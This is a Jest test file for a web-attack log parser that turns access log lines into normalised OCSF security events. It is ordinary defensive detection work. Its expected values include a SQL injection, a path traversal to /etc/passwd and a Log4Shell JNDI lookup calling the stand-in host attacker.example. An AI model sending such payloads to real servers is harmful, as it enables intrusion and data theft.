import { describe, expect, test } from "@jest/globals";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import OcsfSeverity from "../../../../Types/SecurityEvent/OcsfSeverity";
import WebAttackLogParser, {
  AccessLogRequest,
  WEB_ATTACK_MARKERS,
  WebAttackKind,
  readCommonLogFormat,
  readJsonAccessLog,
  readWebAttackKind,
} from "../../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
import { NOT_WEB_ATTACKS, WEB_LINES, logLine } from "./LogParserFixtures";

function parseOne(body: string): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> = WebAttackLogParser.parse(
    logLine(body),
  );

  expect(events).toHaveLength(1);

  return events[0]!;
}

/*
 * A web server logs every request, so only a line with an attack string in
 * it becomes an event: an OCSF HTTP Activity whose target resource is the
 * request target - what the rule library's SQL injection, path traversal
 * and Log4Shell rules read - and whose principal IP is the client.
 */
describe("WebAttackLogParser", () => {
  test("an encoded SQL injection in a combined log format line", () => {
    const event: NormalizedSecurityEvent = parseOne(
      WEB_LINES.sqlInjectionEncoded,
    );

    expect(event.classUid).toBe(4002);
    expect(event.className).toBe("HTTP Activity");
    expect(event.categoryName).toBe("Network Activity");
    expect(event.activityName).toBe("GET");
    expect(event.statusName).toBe("Success");
    expect(event.severityName).toBe(OcsfSeverity.Medium);
    expect(event.principalIp).toBe("203.0.113.40");
    expect(event.targetResource).toBe("/item?id=1%27%20or%201%3D1");
    // A one-line summary of the attack and the answer, not the raw line.
    expect(event.message).toBe(
      "SQL injection attempt: GET /item?id=1%27%20or%201%3D1 → 200",
    );
    expect(event.requestOutcome).toBe("Reached App");
    expect(event.productName).toBe("Web server");
    expect(event.attributes["web.attack.kind"]).toBe(
      WebAttackKind.SqlInjection,
    );
    expect(event.attributes["http.response.status_code"]).toBe("200");
    expect(event.attributes["user_agent.original"]).toBe("sqlmap/1.7.2#stable");
  });

  test("a path traversal the server refused is a failure", () => {
    const event: NormalizedSecurityEvent = parseOne(WEB_LINES.pathTraversal);

    expect(event.statusName).toBe("Failure");
    expect(event.targetResource).toBe("/static/../../etc/passwd");
    expect(event.attributes["web.attack.kind"]).toBe(
      WebAttackKind.PathTraversal,
    );
  });

  test("a JNDI lookup in the user agent", () => {
    const event: NormalizedSecurityEvent = parseOne(
      WEB_LINES.log4ShellInUserAgent,
    );

    expect(event.attributes["web.attack.kind"]).toBe(WebAttackKind.Log4Shell);
    expect(event.message.includes("${jndi:")).toBe(true);
    expect(event.principalIp).toBe("203.0.113.42");
  });

  test("a JSON access log line", () => {
    const event: NormalizedSecurityEvent = parseOne(WEB_LINES.jsonAccessLog);

    expect(event.principalIp).toBe("203.0.113.43");
    expect(event.activityName).toBe("GET");
    expect(event.targetResource).toBe(
      "/search?q=1 union select password from users",
    );
    expect(event.attributes["user_agent.original"]).toBe(
      "python-requests/2.32",
    );
  });

  test("a JNDI lookup in an application's own log keeps the word that carries it and finds the address", () => {
    const event: NormalizedSecurityEvent = parseOne(
      WEB_LINES.log4ShellInApplicationLog,
    );

    expect(event.principalIp).toBe("203.0.113.44");
    // The rules still find the lookup in the target; a person reads it, not the line.
    expect(event.targetResource).toBe(
      "X-Api-Version=${jndi:ldap://attacker.example/x}",
    );
    expect(event.message).toBe(
      "Log4Shell exploit attempt: X-Api-Version=${jndi:ldap://attacker.example/x}",
    );
    expect(event.activityName).toBe("");
    expect(event.statusName).toBe("");
  });

  test.each(
    NOT_WEB_ATTACKS.map((line: string): [string] => {
      return [line];
    }),
  )("an ordinary request is no event: %j", (line: string) => {
    expect(WebAttackLogParser.parse(logLine(line))).toEqual([]);
  });

  test("every marker is found whatever its case", () => {
    for (const group of WEB_ATTACK_MARKERS) {
      for (const marker of group.markers) {
        expect(readWebAttackKind(`GET /x?q=${marker.toUpperCase()}`)).toBe(
          group.kind,
        );
      }
    }
  });

  test("Log4Shell wins over a SQL injection in the same line", () => {
    expect(readWebAttackKind("union select ${jndi:ldap://x}")).toBe(
      WebAttackKind.Log4Shell,
    );
  });

  test("common log format behind a syslog prefix", () => {
    const request: AccessLogRequest | null = readCommonLogFormat(
      'Oct 19 10:00:00 lb-1 nginx: 203.0.113.45 - - [19/Oct/2026:10:00:00 +0000] "POST /login HTTP/2.0" 401 0 "-" "hydra"',
    );

    expect(request).toEqual({
      clientIp: "203.0.113.45",
      method: "POST",
      target: "/login",
      status: 401,
      userAgent: "hydra",
    });
  });

  test("a quoted string that is not a request line is not read as one", () => {
    expect(readCommonLogFormat('user said "hello world" twice')).toBeNull();
    expect(readCommonLogFormat('"GET')).toBeNull();
  });

  test("JSON access logs name their fields many ways", () => {
    expect(
      readJsonAccessLog(
        JSON.stringify({
          client_ip: "203.0.113.46",
          method: "put",
          uri: "/a",
          status_code: 500,
        }),
      ),
    ).toEqual({
      clientIp: "203.0.113.46",
      method: "PUT",
      target: "/a",
      status: 500,
      userAgent: "",
    });
    expect(readJsonAccessLog("{not json")).toBeNull();
    expect(readJsonAccessLog(JSON.stringify({ status: 200 }))).toBeNull();
  });
});
